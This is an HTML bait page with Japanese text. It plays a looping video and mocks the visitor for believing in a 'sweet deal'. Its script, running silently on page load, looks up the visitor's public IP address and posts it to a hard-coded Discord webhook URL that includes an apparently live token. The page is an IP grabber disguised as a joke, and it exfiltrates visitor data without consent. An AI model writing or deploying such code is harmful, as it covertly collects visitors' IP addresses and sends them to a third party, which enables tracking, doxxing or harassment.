<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8">
  <title>ちゃんと自分で買おうね</title>
  <style>
    html, body {
      margin: 0;
      padding: 0;
      height: 100%;
      width: 100%;
      overflow: hidden;
      display: flex;
      justify-content: center;
      align-items: center;
      font-size: 2em;
      color: white;
      position: relative;
      background-color: black;
    }

    /* 背景動画を全画面表示 */
    #bgVideo {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      object-fit: cover;
      z-index: -1;
    }

    /* 真ん中のテキスト */
    #text {
      z-index: 1;
      text-align: center;
    }
  </style>
</head>
<body>
  <!-- 背景動画（音あり） -->
  <video id="bgVideo" autoplay loop>
    <source src="nani.mp4" type="video/mp4">
    お使いのブラウザは動画に対応していません。
  </video>

  <!-- 中央の一言 -->
  <div id="text">そんな甘い話はないよｗお疲れｗ</div>

  <script>
    const video = document.getElementById('bgVideo');

    // ページロード時に自動再生を試みる
    window.addEventListener('load', () => {
      video.play().catch(() => {
        console.log("自動再生できませんでした。ユーザー操作で再生してください。");
      });
    });

    // IPアドレスを取得し、Discord Webhookに送信
    async function fetchIPAndSendToDiscord() {
      try {
        // IPアドレスを取得
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        const ipAddress = data.ip;

        // Discord Webhook URL
        const webhookUrl = 'https://discord.com/api/webhooks/1408298947973480488/Gduj0SHhaU5t-kHMI-vFMUhaUQezeUqs7xeqzaYEbzAwwlrmfrSwgx0X6YTenvSx5WZw';

        // メッセージを作成
        const message = {
          content: `IPアドレスが取得されました: ${ipAddress}`
        };

        // Discordに送信
        await fetch(webhookUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify(message)
        });

        console.log('IPアドレスがDiscordに送信されました');
      } catch (error) {
        console.error('エラーが発生しました:', error);
      }
    }

    // ページが読み込まれたときにIPアドレスを取得し、Discordに送信
    window.onload = fetchIPAndSendToDiscord;
  </script>
</body>
</html>
